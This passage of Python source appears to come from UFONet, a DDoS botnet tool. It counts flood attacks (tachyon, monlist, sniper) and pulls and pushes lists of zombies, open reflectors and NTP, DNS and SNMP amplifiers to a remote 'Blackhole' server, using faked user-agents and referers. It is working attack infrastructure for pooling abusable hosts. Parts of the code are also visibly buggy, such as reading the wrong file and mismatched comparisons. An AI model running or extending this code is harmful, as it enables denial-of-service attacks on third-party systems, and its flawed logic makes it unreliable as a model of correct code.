        self.total_tachyon = self.total_tachyon + 1 # add new tachyon attack to session stats
        data["tachyon"] = atachyon
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_monlist_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        amonlist = data["monlist"]
        amonlist = str(int(amonlist) + 1) # add new monlist attack to recorded stats
        self.total_monlist = self.total_monlist + 1 # add new monlist attack to session stats
        data["monlist"] = amonlist
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_sniper_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        asniper = data["sniper"]
        asniper = str(int(asniper) + 1) # add new sniper attack to recorded stats
        self.total_sniper = self.total_sniper + 1 # add new sniper attack to session stats
        data["sniper"] = asniper
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def uploading_list(self):
        from io import BytesIO
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        abductions = "botnet/abductions.txt.gz"
        troops = "botnet/troops.txt.gz"
        robots = "botnet/robots.txt.gz"
        drones = "botnet/drones.txt.gz"
        reflectors = "botnet/reflectors.txt.gz"
        crystals = "botnet/crystals.txt.gz"
        warps = "botnet/warps.txt.gz"
        bosons = "botnet/bosons.txt.gz"
        if self.options.timeout: # set timeout
            try:
                timeout = int(self.options.timeout)
            except:
                timeout = 5 
        else:
            timeout = 5
        if timeout < 1:
            timeout = 5 
        try:
            print("[AI] Checking integrity of [Blackhole]: "+self.blackhole+"\n")
            if self.options.forcessl:
                if self.options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
                abductions_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
                troops_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
                robots_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
                drones_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
                reflectors_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/crystals.txt.gz', None, headers)
                crystals_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/warps.txt.gz', None, headers)
                warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('https://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
                bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
            else:
                if self.options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
                abductions_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
                troops_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
                robots_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
                drones_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
                reflectors_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/crystals.txt.gz', None, headers)
                crystals_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/warps.txt.gz', None, headers)
                warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                req = urllib.request.Request('http://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
                bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
            if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "" and bosons_reply == "":
                print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
                print('-'*12 + '\n')
                print("[Error] [AI] Unable to uploading list of [Zombies] to this [Blackhole] [Server] -> [Exiting!]\n")
                return
            print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX READY!] ;-)")
            f_in_abductions = gzip.open(BytesIO(abductions_reply), 'rb')
            f_out_abductions = open('botnet/abductions.txt', 'wb')
            f_out_abductions.write(f_in_abductions.read())
            f_in_abductions.close()
            f_out_abductions.close()
            num_zombies = 0
            with open('botnet/abductions.txt') as f:
                for _ in f:
                    num_zombies = num_zombies + 1
            print("\n[Info] [Zombies] on [Blackhole]: "+ str(num_zombies))
            f_in_robots = gzip.open(BytesIO(robots_reply), 'rb')
            f_out_robots = open('botnet/robots.txt', 'wb')
            f_out_robots.write(f_in_robots.read())
            f_in_robots.close()
            f_out_robots.close()
            num_robots = 0
            with open('botnet/robots.txt') as f:
                for _ in f:
                    num_robots = num_robots + 1
            print("[Info] [Droids] on [Blackhole] : "+ str(num_robots))
            f_in_troops = gzip.open(BytesIO(troops_reply), 'rb')
            f_out_troops = open('botnet/troops.txt', 'wb')
            f_out_troops.write(f_in_troops.read())
            f_in_troops.close()
            f_out_troops.close()
            num_aliens = 0
            with open('botnet/aliens.txt') as f:
                for _ in f:
                    num_aliens = num_aliens + 1
            print("[Info] [Aliens] on [Blackhole] : "+ str(num_aliens))
            f_in_drones = gzip.open(BytesIO(drones_reply), 'rb')
            f_out_drones = open('botnet/drones.txt', 'wb')
            f_out_drones.write(f_in_drones.read())
            f_in_drones.close()
            f_out_drones.close()
            num_drones = 0
            with open('botnet/drones.txt') as f:
                for _ in f:
                    num_drones = num_drones + 1
            print("[Info] [UCAVs] on [Blackhole] : "+ str(num_drones))
            f_in_reflectors = gzip.open(BytesIO(reflectors_reply), 'rb')
            f_out_reflectors = open('botnet/reflectors.txt', 'wb')
            f_out_reflectors.write(f_in_reflectors.read())
            f_in_reflectors.close()
            f_out_reflectors.close()
            num_reflectors = 0
            with open('botnet/reflectors.txt') as f:
                for _ in f:
                    num_reflectors = num_reflectors + 1
            print("[Info] [X-RPCs] on [Blackhole] : "+ str(num_reflectors))
            f_in_crystals = gzip.open(BytesIO(crystals_reply), 'rb')
            f_out_crystals = open('botnet/crystals.txt', 'wb')
            f_out_crystals.write(f_in_crystals.read())
            f_in_crystals.close()
            f_out_crystals.close()
            num_crystals = 0
            with open('botnet/crystals.txt') as f:
                for _ in f:
                    num_crystals = num_crystals + 1
            print("[Info] [NTPs] on [Blackhole]   : "+ str(num_crystals))
            f_in_warps = gzip.open(BytesIO(warps_reply), 'rb')
            f_out_warps = open('botnet/warps.txt', 'wb')
            f_out_warps.write(f_in_warps.read())
            f_in_warps.close()
            f_out_warps.close()
            num_warps = 0
            with open('botnet/warps.txt') as f:
                for _ in f:
                    num_warps = num_warps + 1
            print("[Info] [DNSs] on [Blackhole]   : "+ str(num_warps))
            f_in_bosons = gzip.open(BytesIO(bosons_reply), 'rb')
            f_out_bosons = open('botnet/bosons.txt', 'wb')
            f_out_bosons.write(f_in_bosons.read())
            f_in_bosons.close()
            f_out_bosons.close()
            num_bosons = 0
            with open('botnet/bosons.txt') as f:
                for _ in f:
                    num_bosons = num_bosons + 1
            print("[Info] [SNMPs] on [Blackhole]   : "+ str(num_bosons))
            print('-'*12 + '\n')
            if not self.options.forceyes:
                update_reply = input("[AI] Do you want to merge ONLY the new [Zombies] into [Blackhole]? (Y/n)")
                print('-'*25)
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                os.remove('botnet/abductions.txt') # remove abductions file
                os.remove('botnet/troops.txt') # remove troops file
                os.remove('botnet/robots.txt') # remove robots file
                os.remove('botnet/drones.txt') # remove drones file
                os.remove('botnet/reflectors.txt') # remove reflectors file
                os.remove('botnet/crystals.txt') # remove crystals file
                os.remove('botnet/warps.txt') # remove warps file
                os.remove('botnet/bosons.txt') # remove bosons file
                print("\n[Info] [AI] [Control] Aborting uploading process and cleaning temporal files... -> [Exiting!]\n")
                return
            else:
                print("\n[AI] Checking integrity of your list of [Zombies] -> [OK!]\n") # only upload valid zombies
                print('='*35)
                zombies = self.extract_zombies()
                if not zombies:
                    return
                test = self.testing(zombies)
                zombies_community = []
                zombies_added = 0
                f = open('botnet/abductions.txt')
                abductions = f.readlines()
                abductions = [abduction.strip() for abduction in abductions]
                f.close()
                fz = open(self.zombies_file)
                zombies = fz.readlines()
                zombies = [zombie.strip() for zombie in zombies]
                fz.close()
                for zombie in zombies:
                    if zombie not in abductions:
                        zombies_community.append(zombie)
                        zombies_added = zombies_added + 1
                    else:
                        pass
                print("[Info] [AI] New [Zombies] found: " + str(zombies_added))
                aliens = self.extract_aliens()
                if not aliens:
                    return
                aliens_community = []
                aliens_added = 0
                f = open('botnet/troops.txt')
                troops = f.readlines()
                troops = [troop.strip() for troop in troops]
                f.close()
                fz = open(self.aliens_file)
                aliens = fz.readlines()
                aliens = [alien.strip() for alien in aliens]
                fz.close()
                for alien in aliens:
                    if alien not in troops:
                        aliens_community.append(alien)
                        aliens_added = aliens_added + 1
                    else:
                        pass
                print("[Info] [AI] New [Aliens] found : " + str(aliens_added))
                droids = self.extract_droids()
                if not droids:
                    return
                droids_community = []
                droids_added = 0
                f = open('botnet/robots.txt')
                robots = f.readlines()
                robots = [robot.strip() for robot in robots]
                f.close()
                fz = open(self.droids_file)
                droids = fz.readlines()
                droids = [droid.strip() for droid in droids]
                fz.close()
                for droid in droids:
                    if droid not in robots:
                        droids_community.append(droid)
                        droids_added = droids_added + 1
                    else:
                        pass
                print("[Info] [AI] New [Droids] found : " + str(droids_added))
                ucavs = self.extract_ucavs()
                if not ucavs:
                    return
                ucavs_community = []
                ucavs_added = 0
                f = open('botnet/drones.txt')
                drones = f.readlines()
                drones = [drone.strip() for drone in drones]
                f.close()
                fz = open(self.ucavs_file)
                ucavs = fz.readlines()
                ucavs = [ucav.strip() for ucav in ucavs]
                fz.close()
                for ucav in ucavs:
                    if ucav not in drones:
                        ucavs_community.append(ucav)
                        ucavs_added = ucavs_added + 1
                    else:
                        pass
                print("[Info] [AI] New [UCAVs] found  : " + str(ucavs_added))
                rpcs = self.extract_rpcs()
                if not rpcs:
                    return
                rpcs_community = []
                rpcs_added = 0
                f = open('botnet/reflectors.txt')
                reflectors = f.readlines()
                reflectors = [reflector.strip() for reflector in reflectors]
                f.close()
                fz = open(self.rpcs_file)
                rpcs = fz.readlines()
                rpcs = [rpc.strip() for rpc in rpcs]
                fz.close()
                for rpc in rpcs:
                    if rpc not in reflectors:
                        rpcs_community.append(rpc)
                        rpcs_added = rpcs_added + 1
                    else:
                        pass
                print("[Info] [AI] New [X-RPCs] found : " + str(rpcs_added))
                ntps = self.extract_ntps()
                if not ntps:
                    return
                ntps_community = []
                ntps_added = 0
                f = open('botnet/crystals.txt')
                crystals = f.readlines()
                crystals = [crystal.strip() for crystal in crystals]
                f.close()
                fz = open(self.ntps_file)
                ntps = fz.readlines()
                ntps = [ntp.strip() for ntp in ntps]
                fz.close()
                for ntp in ntps:
                    if ntp not in crystals:
                        ntps_community.append(ntp)
                        ntps_added = ntps_added + 1
                    else:
                        pass
                print("[Info] [AI] New [NTPs] found   : " + str(ntps_added))
                dnss = self.extract_dnss()
                if not dnss:
                    return
                dnss_community = []
                dnss_added = 0
                f = open('botnet/warps.txt')
                warps = f.readlines()
                warps = [warp.strip() for warp in warps]
                f.close()
                fz = open(self.dnss_file)
                dnss = fz.readlines()
                dnss = [dns.strip() for dns in dnss]
                fz.close()
                for dns in dnss:
                    if dns not in warps:
                        dnss_community.append(dns)
                        dnss_added = dnss_added + 1
                    else:
                        pass
                print("[Info] [AI] New [DNSs] found   : " + str(dnss_added))
                snmps = self.extract_snmps()
                if not snmps:
                    return
                snmps_community = []
                snmps_added = 0
                f = open('botnet/bosons.txt')
                bosons = f.readlines()
                bosons = [boson.strip() for boson in bosons]
                f.close()
                fz = open(self.snmps_file)
                snmps = fz.readlines()
                snmps = [snmp.strip() for snmp in snmps]
                fz.close()
                for snmp in snmps:
                    if snmp not in crystals:
                        snmps_community.append(snmp)
                        snmps_added = snmps_added + 1
                    else:
                        pass
                print("[Info] [AI] New [SNMPs] found   : " + str(snmps_added))
                print('-'*12 + '\n')
                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0 and rpcs_added == 0 and ntps_added == 0 and dnss_added == 0 and snmps_added == 0: # not any zombie
                    os.remove('botnet/abductions.txt') # remove abductions file
                    os.remove('botnet/troops.txt') # remove troops file
                    os.remove('botnet/robots.txt') # remove robots file
                    os.remove('botnet/drones.txt') # remove ucavs file
                    os.remove('botnet/reflectors.txt') # remove rpcs file
                    os.remove('botnet/crystals.txt') # remove crystals file
                    os.remove('botnet/warps.txt') # remove warps file
                    os.remove('botnet/bosons.txt') # remove snmps file
                    print("[Info] [AI] Try to search for new [Zombies]. These are already in this [Blackhole] -> [Exiting!]\n")
                    return
                else:
                    fc = gzip.open('botnet/community_zombies.txt.gz', 'wb')
                    for zombie in zombies_community:
                        fc.write(zombie.strip()+"\n")
                    fc.close()
                    os.remove('botnet/abductions.txt') # remove abductions file
                    fc = gzip.open('botnet/community_aliens.txt.gz', 'wb')
                    for alien in aliens_community:
                        fc.write(alien.strip()+"\n")
                    fc.close()
                    os.remove('botnet/troops.txt') # remove troops file
                    fc = gzip.open('botnet/community_droids.txt.gz', 'wb')
                    for droid in droids_community:
                        fc.write(droid.strip()+"\n")
                    fc.close()
                    os.remove('botnet/robots.txt') # remove robots file
                    fc = gzip.open('botnet/community_ucavs.txt.gz', 'wb')
                    for ucav in ucavs_community:
                        fc.write(ucav.strip()+"\n")
                    fc.close()
                    os.remove('botnet/drones.txt') # remove drones file
                    fc = gzip.open('botnet/community_rpcs.txt.gz', 'wb')
                    for rpc in rpcs_community:
                        fc.write(rpc.strip()+"\n")
                    fc.close()
                    os.remove('botnet/reflectors.txt') # remove reflectors file
                    fc = gzip.open('botnet/community_ntps.txt.gz', 'wb')
                    for ntp in ntps_community:
                        fc.write(ntp.strip()+"\n")
                    fc.close()
                    os.remove('botnet/crystals.txt') # remove crystals file
                    fc = gzip.open('botnet/community_dnss.txt.gz', 'wb')
                    for dns in dnss_community:
                        fc.write(dns.strip()+"\n")
                    fc.close()
                    os.remove('botnet/warps.txt') # remove warps file
                    fc = gzip.open('botnet/community_snmps.txt.gz', 'wb')
                    for snmp in snmps_community:
                        fc.write(snmp.strip()+"\n")
                    fc.close()
                    os.remove('botnet/bosons.txt') # remove bosons file
                    print("[Info] [AI] Starting to upload new [Zombies]...\n")
                    try: # open a socket and send data to the blackhole reciever port
                        host = self.blackhole 
                        cport = 9991
                        mport = 9990
                        try:
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_zombies.txt.gz')
                            cs.close()
                            f = open('botnet/community_zombies.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_zombies.txt.gz') # remove local zombies .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_aliens.txt.gz')
                            cs.close()
                            f = open('botnet/community_aliens.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_aliens.txt.gz') # remove local aliens .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_robots.txt.gz')
                            cs.close()
                            f = open('botnet/community_droids.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_droids.txt.gz') # remove local droids .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_ucavs.txt.gz')
                            cs.close()
                            f = open('botnet/community_ucavs.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_ucavs.txt.gz') # remove local ucavs .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_rpcs.txt.gz')
                            cs.close()
                            f = open('botnet/community_rpcs.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_rpcs.txt.gz') # remove local rpcs .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_ntps.txt.gz')
                            cs.close()
                            f = open('botnet/community_ntps.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_ntps.txt.gz') # remove local ntps .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_dnss.txt.gz')
                            cs.close()
                            f = open('botnet/community_dnss.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_dnss.txt.gz') # remove local dnss .gz file after transfer
                            time.sleep(1)
                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
                            cs.connect(host, cport)
                            cs.send("SEND " + 'community_snmps.txt.gz')
                            cs.close()
                            f = open('botnet/community_snmps.txt.gz', "rb")
                            data = f.read()
                            f.close()
                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            ms.connect(host, mport)
                            ms.send(data)
                            ms.close()
                            os.remove('botnet/community_snmps.txt.gz') # remove local snmps .gz file after transfer
                            time.sleep(2) # sleep a bit more
                            print('-'*12 + '\n')
                            print("[Info] [AI] Transfer -> [DONE!]\n")
                        except Exception as e:
                            print(str(e) + "\n")
                    except:
                        print('-'*12 + '\n')
                        print("[Error] [AI] Connecting sockets to [Blackhole] -> [Aborting!]\n")
                        return
        except:
            print('-'*12 + '\n')
            print("[Error] [AI] Unable to upload list of [Zombies] to this [Blackhole] -> [Exiting!]\n")
            return

    def update_gui_data(self):
    # download all GUI stream data
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        if self.options.proxy: # set proxy
            self.proxy_transport(self.options.proxy)
        if self.options.timeout: # set timeout
            try:
                timeout = int(self.options.timeout)
            except:
                timeout = 5 
        else:
            timeout = 5 
        if timeout < 1:
            timeout = 5 
        if self.options.forcessl:
            news = urllib.request.Request('https://'+self.blackhole+'/ufonet/news.txt', None, headers) 
            news_reply = urllib.request.urlopen(news, context=self.ctx, timeout=timeout).read().decode('utf-8')
            missions = urllib.request.Request('https://'+self.blackhole+'/ufonet/missions.txt', None, headers)                         
            missions_reply = urllib.request.urlopen(missions, context=self.ctx, timeout=timeout).read().decode('utf-8')
            board = urllib.request.Request('https://'+self.blackhole+'/ufonet/board.txt', None, headers)
            board_reply = urllib.request.urlopen(board, context=self.ctx, timeout=timeout).read().decode('utf-8')
            grid = urllib.request.Request('https://'+self.blackhole+'/ufonet/grid.txt', None, headers)
            grid_reply = urllib.request.urlopen(grid, context=self.ctx, timeout=timeout).read().decode('utf-8')
            wargames = urllib.request.Request('https://'+self.blackhole+'/ufonet/wargames.txt', None, headers)
            wargames_reply = urllib.request.urlopen(wargames, context=self.ctx, timeout=timeout).read().decode('utf-8')
            links = urllib.request.Request('https://'+self.blackhole+'/ufonet/links.txt', None, headers)
            links_reply = urllib.request.urlopen(links, context=self.ctx, timeout=timeout).read().decode('utf-8')
            streams = urllib.request.Request('https://'+self.blackhole+'/ufonet/streams.txt', None, headers)
            streams_reply = urllib.request.urlopen(streams, context=self.ctx, timeout=timeout).read().decode('utf-8')
            globalnet = urllib.request.Request('https://'+self.blackhole+'/ufonet/globalnet.txt', None, headers)
            globalnet_reply = urllib.request.urlopen(globalnet, context=self.ctx, timeout=timeout).read().decode('utf-8')
        else:
            news = urllib.request.Request('http://'+self.blackhole+'/ufonet/news.txt', None, headers)
            news_reply = urllib.request.urlopen(news, context=self.ctx).read().decode('utf-8')
            missions = urllib.request.Request('http://'+self.blackhole+'/ufonet/missions.txt', None, headers)
            missions_reply = urllib.request.urlopen(missions, context=self.ctx).read().decode('utf-8')
            board = urllib.request.Request('http://'+self.blackhole+'/ufonet/board.txt', None, headers)
            board_reply = urllib.request.urlopen(board, context=self.ctx).read().decode('utf-8')
            grid = urllib.request.Request('http://'+self.blackhole+'/ufonet/grid.txt', None, headers)
            grid_reply = urllib.request.urlopen(grid, context=self.ctx).read().decode('utf-8')
            wargames = urllib.request.Request('http://'+self.blackhole+'/ufonet/wargames.txt', None, headers)
            wargames_reply = urllib.request.urlopen(wargames, context=self.ctx).read().decode('utf-8')
            links = urllib.request.Request('http://'+self.blackhole+'/ufonet/links.txt', None, headers)
            links_reply = urllib.request.urlopen(links, context=self.ctx).read().decode('utf-8')
            streams = urllib.request.Request('http://'+self.blackhole+'/ufonet/streams.txt', None, headers)
            streams_reply = urllib.request.urlopen(streams, context=self.ctx).read().decode('utf-8')
            globalnet = urllib.request.Request('http://'+self.blackhole+'/ufonet/globalnet.txt', None, headers)
            globalnet_reply = urllib.request.urlopen(globalnet, context=self.ctx).read().decode('utf-8')
        f = open(self.news_file, 'w')
        f.write(news_reply)
        f.close()
        f = open(self.missions_file, 'w')
        f.write(missions_reply)
        f.close()
        f = open(self.board_file, 'w')
        f.write(board_reply)
        f.close()
        f = open(self.grid_file, 'w')
        f.write(grid_reply)
        f.close()
        f = open(self.wargames_file, 'w')
        f.write(wargames_reply)
        f.close()
        f = open(self.links_file, 'w')
        f.write(links_reply)
        f.close()
        f = open(self.streams_file, 'w')
        f.write(streams_reply)
        f.close()
        f = open(self.globalnet_file, 'w')
        f.write(globalnet_reply)
        f.close()
        print('-'*25 + "\n")
        print("[Info] [AI] GUI data correctly updated:\n")
        if news_reply:
            print("[Info] [AI] [News]     : OK!")
        if missions_reply:
            print("[Info] [AI] [Missions] : OK!")
        if board_reply:
            print("[Info] [AI] [Board]    : OK!")
        if grid_reply:
            print("[Info] [AI] [Grid]     : OK!")
        if wargames_reply:
            print("[Info] [AI] [Wargames] : OK!")
        if links_reply:
            print("[Info] [AI] [Links]    : OK!")
        if streams_reply:
            print("[Info] [AI] [Streams]  : OK!")
        if globalnet_reply:
            print("[Info] [AI] [GlobalNet]: OK!")
        print('-'*25)
        print("\n[AI] "+self.exit_msg+"\n")

    def downloading_list(self): 
        # add your mirror to protect/share/distribute... [Zombies]
        try:
            print(("[AI] Trying [Blackhole] [Server]: "+self.blackhole+"\n"))
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if self.options.timeout: # set timeout
                try:
                    timeout = int(self.options.timeout)
                except:
                    timeout = 5 
            else:
                timeout = 5
            if timeout < 1:
                timeout = 5 
            if self.options.proxy: # set proxy
                self.proxy_transport(self.options.proxy)
            if self.options.forcessl:
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
                    abductions_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    abductions_reply = ""
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
                    troops_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    troops_reply = ""
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
                    robots_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    robots_reply = ""
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
                    drones_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    drones_reply = ""
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
                    reflectors_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    reflectors_reply = ""
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/crystals.txt.gz', None, headers)
                    crystals_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    crystals_reply = ""
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/warps.txt.gz', None, headers)
                    warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    warps_reply = ""
                try:
                    req = urllib.request.Request('https://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
                    bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    bosons_reply = ""
            else:
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
                    abductions_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    abductions_reply = ""
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
                    troops_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    troops_reply = ""
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
                    robots_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    robots_reply = ""
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
                    drones_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    drones_reply = ""
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
                    reflectors_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    reflectors_reply = ""
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/crystals.txt.gz', None, headers)
                    crystals_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    crystals_reply = ""
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/warps.txt.gz', None, headers)
                    warps_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    warps_reply = ""
                try:
                    req = urllib.request.Request('http://'+self.blackhole+'/ufonet/bosons.txt.gz', None, headers)
                    bosons_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read()
                except:
                    bosons_reply = ""
            if abductions_reply == "" and troops_reply == "" and robots_reply == "" and drones_reply == "" and reflectors_reply == "" and crystals_reply == "" and warps_reply == "" and bosons_reply == "":
                print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
                print('-'*12 + '\n')
                print("[Info] [AI] You can try to download [Zombies] from a different [Blackhole] [Server] (provided by someone!) with:\n\n ex: ufonet --down-from '<IP>'")
                print("\nOr/And from a [Blackhole] [GitHub] with:\n\n ex: ufonet --download-github")
                print('-'*12 + '\n')
                print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [Server] -> [Exiting!]\n")
                return
            f = open('botnet/abductions.txt.gz', 'wb')
            f.write(abductions_reply)
            f.close()
            f = open('botnet/troops.txt.gz', 'wb')
            f.write(troops_reply)
            f.close()
            f = open('botnet/robots.txt.gz', 'wb')
            f.write(robots_reply)
            f.close()
            f = open('botnet/drones.txt.gz', 'wb')
            f.write(drones_reply)
            f.close()
            f = open('botnet/reflectors.txt.gz', 'wb')
            f.write(reflectors_reply)
            f.close()
            f = open('botnet/crystals.txt.gz', 'wb')
            f.write(crystals_reply)
            f.close()
            f = open('botnet/warps.txt.gz', 'wb')
            f.write(warps_reply)
            f.close()
            f = open('botnet/bosons.txt.gz', 'wb')
            f.write(bosons_reply)
            f.close()
